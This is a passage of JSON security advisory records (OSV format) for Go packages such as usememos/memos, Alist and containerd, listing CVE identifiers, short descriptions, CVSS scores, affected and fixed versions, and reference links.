"https://nvd.nist.gov/vuln/detail/CVE-2022-4809"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e46c5380-a590-40de-a8e5-79872ee0bb29"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:09:40Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pmg2-rph8-p8r6", "modified": "2022-12-20T15:23:21Z", "published": "2022-12-16T00:30:44Z", "aliases": ["CVE-2022-45969"], "summary": "Alist vulnerable to Path Traversal", "details": "In versions of Alist prior to 3.6.0, a user with only file upload permission can bypass the base path restriction by using '... /' to bypass the base path restriction and upload files to an arbitrary path.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/alist-org/alist/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45969"}, {"type": "WEB", "url": "https://github.com/alist-org/alist/issues/2449"}, {"type": "WEB", "url": "https://github.com/alist-org/alist/commit/b5bf5f43253175b55fa2cb511fea601e677d2d83"}, {"type": "PACKAGE", "url": "https://github.com/alist-org/alist"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-16T17:21:27Z", "nvd_published_at": "2022-12-15T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6fx9-29x2-fmfj", "modified": "2023-01-10T15:44:37Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4814"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "Improper Access Control in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4814"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e65b3458-c2e2-4c0b-9029-e3c9ee015ae4"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:12:23Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p6fg-723f-hgpw", "modified": "2023-01-10T15:58:24Z", "published": "2022-12-28T03:30:28Z", "aliases": ["CVE-2020-36562"], "summary": "shiyanhui/dht vulnerable to Uncontrolled Resource Consumption", "details": "Due to unchecked type assertions, maliciously crafted messages can cause panics, which may be used as a denial of service vector.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/shiyanhui/dht"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.0.0-20201219151056-5a20f3199263"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36562"}, {"type": "WEB", "url": "https://github.com/shiyanhui/dht/issues/57"}, {"type": "PACKAGE", "url": "https://github.com/shiyanhui/dht"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0040"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-617"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:48:43Z", "nvd_published_at": "2022-12-28T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hc5q-26h8-r9wf", "modified": "2023-01-10T15:43:56Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4811"], "summary": "usememos/memos Improper Authorization vulnerability", "details": "In usememos/memos 0.9.0 and prior, an unauthorized user can access any private memo by URL hacking a memo on the editing screen.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4811"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e907b754-4f33-46b6-9dd2-0d2223cb060c"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-639", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:11:45Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5jqp-wmhj-g33f", "modified": "2023-01-10T00:52:28Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4844"], "summary": "usememos/memos Cross-Site Request Forgery vulnerability", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4844"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/8e8df1f4-07ab-4b75-aec8-75b1229e93a3"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:52:57Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gw62-c7w4-x449", "modified": "2022-12-30T00:58:42Z", "published": "2022-12-21T21:30:15Z", "aliases": ["CVE-2021-4272"], "summary": "studygolang vulnerable to cross-site scripting", "details": "A vulnerability classified as problematic has been found in studygolang. This affects an unknown part of the file static/js/topics.js. The manipulation of the argument contentHtml leads to cross site scripting. It is possible to initiate the attack remotely. The name of the patch is 0fb30f9640bd5fa0cae58922eac6c00bb1a94391. It is recommended to apply a patch to fix this issue. The identifier VDB-216477 was assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/studygolang/studygolang"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4272"}, {"type": "WEB", "url": "https://github.com/studygolang/studygolang/commit/0fb30f9640bd5fa0cae58922eac6c00bb1a94391"}, {"type": "PACKAGE", "url": "https://github.com/studygolang/studygolang"}, {"type": "WEB", "url": "https://vuldb.com/?id.216477"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T00:58:42Z", "nvd_published_at": "2022-12-21T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2qjp-425j-52j9", "modified": "2022-12-07T23:23:43Z", "published": "2022-12-07T23:23:43Z", "aliases": ["CVE-2022-23471"], "summary": "containerd CRI stream server vulnerable to host memory exhaustion via terminal", "details": "### Impact\n\nA bug was found in containerd's CRI implementation where a user can exhaust memory on the host. In the CRI stream server, a goroutine is launched to handle terminal resize events if a TTY is requested. If the user's process fails to launch due to, for example, a faulty command, the goroutine will be stuck waiting to send without a receiver, resulting in a memory leak. Kubernetes and crictl can both be configured to use containerd's CRI implementation and the stream server is used for handling container IO.\n\n### Patches\n\nThis bug has been fixed in containerd 1.6.12 and 1.5.16.  Users should update to these versions to resolve the issue.\n\n### Workarounds\n\nEnsure that only trusted images and commands are used and that only trusted users have permissions to execute commands in running containers. \n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)\n\nTo report a security issue in containerd:\n* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.12"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-2qjp-425j-52j9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23471"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/241563be06a3de8b6a849414c4e805b68d3bb295"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/a05d175400b1145e5e6a735a6710579d181e7fb0"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.16"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.6.12"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-401"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-07T23:23:43Z", "nvd_published_at": "2022-12-07T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j8x2-2m5w-j939", "modified": "2023-04-03T19:24:00Z", "published": "2022-12-12T14:38:28Z", "aliases": ["CVE-2022-23511"], "summary": "Amazon CloudWatch Agent for Windows has Privilege Escalation Vector", "details": "### Impact\nA privilege escalation issue exists within the Amazon CloudWatch Agent for Windows in versions up to and including v1.247354. When users trigger a repair of the Agent, a pop-up window opens with SYSTEM permissions. Users with administrative access to affected hosts may use this to create a new command prompt as NT AUTHORITY\\SYSTEM. \n \nTo trigger this issue, the third party must be able to access the affected host and elevate their privileges such that they\u2019re able to trigger the agent repair process. They must also be able to install the tools required to trigger the issue. \n\nThis issue does not affect the CloudWatch Agent for macOS or Linux. \n\n### Patches\nMaintainers recommend that Agent users upgrade to the latest available version of the CloudWatch Agent to address this issue. \n\n### Workarounds\nThere is no recommended work around. Affected users must update the installed version of the CloudWatch Agent to address this issue.\n\n### References\nhttps://github.com/aws/amazon-cloudwatch-agent/commit/6119858864c317ff26f41f576c169148d1250837\n\n### For more information \n \nIf you have any questions or comments about this advisory, contact AWS/Amazon Security via their [vulnerability reporting page](http://aws.amazon.com/security/vulnerability-reporting/) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/aws/amazon-cloudwatch-agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.247355.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/aws/amazon-cloudwatch-agent/security/advisories/GHSA-j8x2-2m5w-j939"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23511"}, {"type": "WEB", "url": "https://github.com/aws/amazon-cloudwatch-agent/commit/6119858864c317ff26f41f576c169148d1250837"}, {"type": "WEB", "url": "https://github.com/aws/amazon-cloudwatch-agent/commit/6119858864c317ff26f41f576c169148d1250837#diff-76ed074a9305c04054cdebb9e9aad2d818052b07091de1f20cad0bbac34ffb52"}, {"type": "PACKAGE", "url": "https://github.com/aws/amazon-cloudwatch-agent"}], "database_specific": {"cwe_ids": ["CWE-274"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-12T14:38:28Z", "nvd_published_at": "2022-12-12T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ppp9-7jff-5vj2", "modified": "2023-01-09T20:02:12Z", "published": "2022-12-26T06:30:22Z", "aliases": ["CVE-2021-38561"], "summary": "golang.org/x/text/language Out-of-bounds Read vulnerability", "details": "golang.org/x/text/language in golang.org/x/text before 0.3.7 can panic with an out-of-bounds read during BCP 47 language tag parsing. Index calculation is mishandled. If parsing untrusted user input, this can be used as a vector for a denial-of-service attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/text"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38561"}, {"type": "WEB", "url": "https://deps.dev/advisory/OSV/GO-2021-0113"}, {"type": "WEB", "url": "https://go.dev/cl/340830"}, {"type": "WEB", "url": "https://go.googlesource.com/text/+/383b2e75a7a4198c42f8f87833eefb772868a56f"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce"}, {"type": "WEB", "url": "https://pkg.go.dev/golang.org/x/text/language"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0113"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T20:02:12Z", "nvd_published_at": "2022-12-26T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gxqf-4g4p-q3hc", "modified": "2023-01-10T15:37:45Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4839"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4839"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/64e5c343c5f74b0abdf3ac0d21a6139daea58cf8"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ad954cab-f026-4895-8003-99f5e3b507ed"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:46Z", "nvd_published_at": "2022-12-29T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5vw4-v588-pgv8", "modified": "2023-01-10T16:02:05Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2015-10004"], "summary": "robbert229/jwt's token validation methods vulnerable to a timing side-channel during HMAC comparison", "details": "Token validation methods are susceptible to a timing side-channel during HMAC comparison. With a large enough number of requests over a low latency connection, an attacker may use this to determine the expected HMAC.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/robbert229/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20170426191122-ca1404ee6e83"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-10004"}, {"type": "WEB", "url": "https://github.com/robbert229/jwt/issues/12"}, {"type": "WEB", "url": "https://github.com/robbert229/jwt/commit/ca1404ee6e83fcbafb66b09ed0d543850a15b654"}, {"type": "PACKAGE", "url": "https://github.com/robbert229/jwt"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0023"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:33:01Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fv6c-rfg3-gvjw", "modified": "2023-01-02T20:21:28Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4687"], "summary": "usememos/memos makes Incorrect Use of Privileged APIs", "details": "Incorrect Use of Privileged APIs in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4687"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b908377f-a61b-432c-8e6a-c7498da69788"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-648"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:25:32Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4fv8-w65m-3932", "modified": "2022-12-30T16:57:49Z", "published": "2022-12-30T16:57:49Z", "aliases": ["CVE-2022-46174"], "summary": "efs-utils and aws-efs-csi-driver have race condition during concurrent TLS mounts", "details": "### Impact\nA potential race condition issue exists within the Amazon EFS mount helper in efs-utils versions v1.34.3 and below, and aws-efs-csi-driver versions v1.4.7 and below. When using TLS to mount file systems, the mount helper allocates a local port for stunnel to receive NFS connections prior to applying the TLS tunnel. In affected versions, concurrent mount operations can allocate the same local port, leading to either failed mount operations or an inappropriate mapping from an EFS customer\u2019s local mount points to that customer\u2019s EFS file systems.\n\nAffected versions: efs-utils <= v1.34.3, aws-efs-csi-driver <= v1.4.7\n\n### Patches\nThe patches are included in efs-utils version v1.34.4 and newer, and in aws-efs-csi-driver v1.4.8 and newer.\n\n### Workarounds\nThere is no recommended work around. We recommend affected users update the installed version of efs-utils to v1.34.4+ or aws-efs-csi-driver to v1.4.8+ to address this issue.\n\n### References\nhttps://github.com/aws/efs-utils/commit/f3a8f88167d55caa2f78aeb72d4dc1987a9ed62d\nhttps://github.com/aws/efs-utils/issues/125\nhttps://github.com/kubernetes-sigs/aws-efs-csi-driver/issues/282\nhttps://github.com/kubernetes-sigs/aws-efs-csi-driver/issues/635\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes-sigs/aws-efs-csi-driver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.4.7"}}], "references": [{"type": "WEB", "url": "https://github.com/aws/efs-utils/security/advisories/GHSA-4fv8-w65m-3932"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46174"}, {"type": "WEB", "url": "https://github.com/aws/efs-utils/issues/125"}, {"type": "WEB", "url": "https://github.com/aws/efs-utils/commit/f3a8f88167d55caa2f78aeb72d4dc1987a9ed62d"}, {"type": "PACKAGE", "url": "https://github.com/aws/efs-utils"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:57:49Z", "nvd_published_at": "2022-12-28T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8w5q-5fpq-v4pm", "modified": "2023-01-10T16:02:49Z", "published": "2022-12-31T09:30:42Z", "aliases": ["CVE-2022-4865"], "summary": "usememos/memos Cross-site Scripting vulnerability", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4865"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/7670c9536000bb32c6345d4906a91268dcddd5fc"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/cd8765a2-bf28-4019-8647-882ccf63b2be"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-04T15:19:12Z", "nvd_published_at": "2022-12-31T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jr65-gpj5-cw74", "modified": "2022-12-29T00:33:22Z", "published": "2022-12-28T03:30:28Z", "aliases": ["CVE-2022-3347"], "summary": "go-resolver's DNSSEC validation not performed correctly", "details": "go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. Root DNSSEC public keys are not validated, permitting an attacker to present a self-signed root key and delegation chain.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/peterzen/goresolver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3347"}, {"type": "WEB", "url": "https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257"}, {"type": "PACKAGE", "url": "https://github.com/peterzen/goresolver"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1026"}], "database_specific": {"cwe_ids": ["CWE-345", "CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-29T00:33:22Z", "nvd_published_at": "2022-12-28T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6whj-8g9g-5jvx", "modified": "2023-01-10T16:15:33Z", "published": "2022-12-30T18:30:44Z", "aliases": ["CVE-2022-4863"], "summary": "usememos/memos vulnerable to Improper Handling of Insufficient Permissions or Privileges", "details": "Improper Handling of Insufficient Permissions or Privileges in GitHub repository usememos/memos prior to 0.9.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4863"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/42751929-e511-49a9-888d-d5b610da2a45"}], "database_specific": {"cwe_ids": ["CWE-280"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-04T15:18:43Z", "nvd_published_at": "2022-12-30T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qf9q-3wwx-8qjv", "modified": "2023-01-10T15:43:21Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4810"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "In usememos/memos 0.9.0 and prior, a user can view any content from private memos from other users via the API.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4810"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/f0c8d778-db86-4ed3-85bb-5315ab56915e"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:11:35Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c2v4-8r9g-g5xj", "modified": "2023-01-09T08:20:53Z", "published": "2022-12-27T15:30:19Z", "aliases": ["CVE-2022-4695"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4695"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/65cc19c12efa392f792f6bb154b4838547e0af5e"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/2559d548-b847-40fb-94d6-18c1ad58b789"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:02:37Z", "nvd_published_at": "2022-12-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qcf5-m2c6-89f2", "modified": "2023-01-10T15:45:55Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4798"], "summary": "usememos/memos Improper Authorization vulnerability", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Authorization.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4798"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e12eed25-1a8e-4ee1-b846-2d4df1db2fae"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:57:20Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4wp2-8rm2-jgmh", "modified": "2023-01-09T21:49:10Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2014-125026"], "summary": "LZ4 vulnerable to Out-of-bounds Write", "details": "LZ4 bindings use a deprecated C API that is vulnerable to memory corruption, which could lead to arbitrary code execution if called with untrusted user input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/golz4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20140711154735-199f5f787806"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-125026"}, {"type": "WEB", "url": "https://github.com/cloudflare/golz4/issues/5"}, {"type": "WEB", "url": "https://github.com/cloudflare/golz4/commit/199f5f7878062ca17a98e079f2dbe1205e2ed898"}, {"type": 